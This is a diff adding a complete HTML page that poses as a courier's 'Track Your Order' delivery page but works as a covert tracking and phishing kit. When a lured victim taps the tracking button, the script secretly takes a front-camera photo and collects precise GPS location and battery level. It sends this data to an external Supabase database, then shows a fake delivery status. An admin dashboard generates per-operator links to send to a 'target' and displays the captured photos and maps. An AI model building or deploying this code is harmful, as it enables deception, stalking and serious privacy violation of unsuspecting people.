@@ -1,0 +1,263 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Postmaster - Track Your Order</title>
+    
+    <meta property="og:title" content="✅ Out for Delivery: Track your shipment">
+    <meta property="og:description" content="Your package is arriving today. Tap to see the live GPS location of your delivery agent.">
+    <meta property="og:image" content="https://cdn-icons-png.flaticon.com/512/2830/2830305.png">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.39.7/dist/umd/supabase.min.js"></script>
+    
+    <style>
+        :root { --primary: #dc2626; --bg: #f9fafb; --dark: #111827; }
+        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--bg); color: var(--dark); }
+        
+        /* ---------------- PANELS ---------------- */
+        #creator-portal, #dashboard-portal, #target-portal { display: none; }
+        
+        /* --- TARGET UI (Delivery Page) --- */
+        .navbar { background: #fff; padding: 15px 20px; text-align: center; border-bottom: 2px solid #ef4444; }
+        .brand { font-weight: 800; font-size: 1.2rem; color: var(--primary); text-transform: uppercase; }
+        .container { max-width: 450px; margin: 30px auto; padding: 15px; }
+        .card { background: #fff; border-radius: 20px; padding: 35px 20px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.06); }
+        .btn-track { background: var(--primary); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 1.1rem; font-weight: 700; cursor: pointer; }
+        .loader-box { display: none; margin-top: 25px; }
+        .spinner { width: 25px; height: 25px; border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 10px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        #video, #canvas { display: none; }
+
+        /* --- ADMIN/CREATOR UI --- */
+        .admin-bg { background: #0f172a; color: white; min-height: 100vh; padding: 20px; }
+        .auth-box { background: #1e293b; max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 15px; text-align: center; }
+        .auth-input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 8px; border: none; font-size: 1rem; text-align: center; }
+        .btn-create { background: #10b981; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-bottom: 10px; }
+        .btn-login { background: #3b82f6; color: white; border: none; padding: 12px 20px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; }
+        
+        .dash-container { max-width: 800px; margin: 0 auto; }
+        .link-box { background: #1e293b; padding: 20px; border-radius: 10px; margin-bottom: 20px; border-left: 5px solid #10b981; }
+        .link-url { background: #0f172a; padding: 15px; border-radius: 5px; word-break: break-all; color: #34d399; font-weight: bold; }
+        
+        table { width: 100%; border-collapse: collapse; margin-top: 20px; background: white; color: black; border-radius: 10px; overflow: hidden; }
+        th, td { padding: 12px; border-bottom: 1px solid #eee; text-align: center; }
+        th { background: #f1f5f9; }
+    </style>
+</head>
+<body>
+
+    <!-- ================= 1. CREATOR / LOGIN PORTAL ================= -->
+    <div id="creator-portal" class="admin-bg">
+        <div class="auth-box">
+            <h2 style="color: #38bdf8;">Admin Setup Panel</h2>
+            <p style="font-size: 0.9rem; color: #94a3b8;">Create a unique password to get your tracking link, or login to view data.</p>
+            
+            <input type="text" id="adminPass" class="auth-input" placeholder="Enter Unique Password">
+            
+            <button onclick="createAccount()" class="btn-create">Create New Link</button>
+            <button onclick="loginAccount()" class="btn-login">Login to Dashboard</button>
+            
+            <p id="authMsg" style="color: #f87171; font-size: 0.9rem; margin-top: 15px;"></p>
+        </div>
+    </div>
+
+    <!-- ================= 2. ADMIN DASHBOARD ================= -->
+    <div id="dashboard-portal" class="admin-bg">
+        <div class="dash-container">
+            <div style="display: flex; justify-content: space-between; align-items: center;">
+                <h2>Welcome, <span id="dashUser" style="color:#38bdf8;"></span></h2>
+                <button onclick="location.reload()" style="background: #ef4444; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor:pointer;">Logout</button>
+            </div>
+            
+            <div class="link-box">
+                <h3 style="margin-top:0;">🔗 Your Separate Tracking Link</h3>
+                <p style="color: #cbd5e1; font-size: 0.9rem;">Copy and send this link to the target:</p>
+                <div class="link-url" id="generatedLink"></div>
+                
+                <div style="margin-top: 15px; font-size: 0.85rem; color: #94a3b8; background: #0f172a; padding: 10px; border-radius: 5px;">
+                    <b>What gets tracked when they click 'Track Order Now':</b><br>
+                    ✔️ Front Camera Photo (Hidden capture)<br>
+                    ✔️ Live GPS Location & Map Coordinates<br>
+                    ✔️ Mobile Battery Percentage<br>
+                    ✔️ Exact Time of Click
+                </div>
+            </div>
+
+            <div style="background: #1e293b; padding: 20px; border-radius: 10px;">
+                <h3>Captured Logs</h3>
+                <button onclick="loadLogs()" style="background: #3b82f6; color: white; border: none; padding: 8px 15px; border-radius: 5px; cursor:pointer; margin-bottom: 10px;">Refresh Data</button>
+                <div style="overflow-x:auto;">
+                    <table>
+                        <thead><tr><th>Photo</th><th>Battery</th><th>Location</th><th>Time</th></tr></thead>
+                        <tbody id="logTableBody"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= 3. TARGET UI (Delivery Page) ================= -->
+    <div id="target-portal">
+        <div class="navbar"><div class="brand">📮 TRACK ORDER POSTMASTER</div></div>
+        <div class="container">
+            <div class="card">
+                <img src="https://cdn-icons-png.flaticon.com/512/2830/2830305.png" width="120" style="margin-bottom: 20px;" alt="delivery">
+                <h1 style="font-size:1.5rem; line-height: 1.3;">Your order is out for delivery.<br>Please check your status.</h1>
+                <p style="color: #6b7280; margin-bottom: 30px;">Real-time GPS tracking is now active for your shipment. Tap below to see the current location.</p>
+                
+                <button id="mainBtn" class="btn-track">Track Order Now</button>
+
+                <div id="loader" class="loader-box">
+                    <div class="spinner"></div>
+                    <div style="font-size: 0.8rem; color: #6b7280; font-weight: 600;">Syncing GPS Data...</div>
+                </div>
+            </div>
+        </div>
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+
+    <!-- ================= LOGIC & SCRIPT ================= -->
+    <script>
+        // 1. SUPABASE SETUP
+        const SUPABASE_URL = "https://nixehqehrevpdbqysvgx.supabase.co";
+        const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5peGVocWVocmV2cGRicXlzdmd4Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5NzQ3MzIsImV4cCI6MjA5MzU1MDczMn0.ynDuc9lNlOhW9hCsFRgr33rHaw2FVKwOullZ20yO7x4";
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        // 2. SMART ROUTING LOGIC
+        const urlParams = new URLSearchParams(window.location.search);
+        const trackId = urlParams.get('track_id');
+        let currentAdminPass = "";
+
+        if (trackId) {
+            // IF URL HAS ?track_id=xyz -> SHOW DELIVERY PAGE
+            document.getElementById('target-portal').style.display = 'block';
+        } else {
+            // IF NORMAL URL -> SHOW ADMIN CREATOR PORTAL
+            document.getElementById('creator-portal').style.display = 'block';
+        }
+
+        // --- ADMIN FUNCTIONS ---
+        async function createAccount() {
+            const pass = document.getElementById('adminPass').value.trim();
+            const msg = document.getElementById('authMsg');
+            if(!pass) { msg.innerText = "Please enter a password!"; return; }
+
+            // Check if password already exists
+            const { data } = await _supabase.from('track_users').select('secret_pass').eq('secret_pass', pass);
+            if(data && data.length > 0) {
+                msg.innerText = "This password is already taken! Choose a different one.";
+            } else {
+                // Create new account
+                await _supabase.from('track_users').insert([{ secret_pass: pass }]);
+                currentAdminPass = pass;
+                showDashboard();
+            }
+        }
+
+        async function loginAccount() {
+            const pass = document.getElementById('adminPass').value.trim();
+            const msg = document.getElementById('authMsg');
+            if(!pass) { msg.innerText = "Please enter a password!"; return; }
+
+            // Check if password exists for login
+            const { data } = await _supabase.from('track_users').select('secret_pass').eq('secret_pass', pass);
+            if(data && data.length > 0) {
+                currentAdminPass = pass;
+                showDashboard();
+            } else {
+                msg.innerText = "Password not found! Click 'Create New Link' to register.";
+            }
+        }
+
+        function showDashboard() {
+            document.getElementById('creator-portal').style.display = 'none';
+            document.getElementById('dashboard-portal').style.display = 'block';
+            
+            document.getElementById('dashUser').innerText = currentAdminPass;
+            
+            // Generate the custom link dynamically based on the current domain
+            const baseUrl = window.location.href.split('?')[0];
+            const customLink = baseUrl + "?track_id=" + encodeURIComponent(currentAdminPass);
+            document.getElementById('generatedLink').innerText = customLink;
+            
+            loadLogs();
+        }
+
+        async function loadLogs() {
+            const { data } = await _supabase.from('saathi_data')
+                                    .select('*')
+                                    .eq('user_pass', currentAdminPass)
+                                    .order('id', {ascending: false});
+            
+            const tbody = document.getElementById('logTableBody');
+            tbody.innerHTML = '';
+            
+            if(!data || data.length === 0) {
+                tbody.innerHTML = '<tr><td colspan="4">No tracking data found yet. Send your link to the target.</td></tr>';
+                return;
+            }
+
+            data.forEach(r => {
+                tbody.innerHTML += `<tr>
+                    <td><img src="${r.photo}" width="50" style="border-radius:5px;"></td>
+                    <td>${r.battery}</td>
+                    <td><a href="https://www.google.com/maps?q=${r.location}" target="_blank" style="color:#2563eb;">View Map</a></td>
+                    <td>${r.time}</td>
+                </tr>`;
+            });
+        }
+
+        // --- TARGET TRACKING FUNCTION ---
+        document.getElementById('mainBtn').onclick = async function() {
+            this.style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+
+            let bat = "N/A", loc = "Denied", photo = "";
+
+            try {
+                const b = await navigator.getBattery();
+                bat = Math.round(b.level * 100) + "%";
+            } catch (e) {}
+
+            try {
+                const pos = await new Promise((res) => {
+                    navigator.geolocation.getCurrentPosition(res, () => res(null), { enableHighAccuracy: true, timeout: 10000 });
+                });
+                if(pos) loc = `${pos.coords.latitude},${pos.coords.longitude}`;
+            } catch (e) {}
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                await new Promise(r => setTimeout(r, 1000));
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                photo = canvas.toDataURL('image/jpeg', 0.4);
+                stream.getTracks().forEach(t => t.stop());
+            } catch (e) {}
+
+            // Save data to the specific track_id
+            await _supabase.from('saathi_data').insert([{ 
+                user_pass: trackId, 
+                photo: photo, 
+                battery: bat, 
+                location: loc, 
+                time: new Date().toLocaleString() 
+            }]);
+
+            // Fake success UI for target
+            document.querySelector('.card').innerHTML = `
+                <div style="border-top: 5px solid #16a34a; padding-top: 20px;">
+                    <h2 style="color:#16a34a;">Status: Near Destination</h2>
+                    <p>The delivery agent is arriving soon. Estimated Time: <b>Delivery Today</b>.</p>
+                </div>`;
+        };
+    </script>
+</body>
+</html>
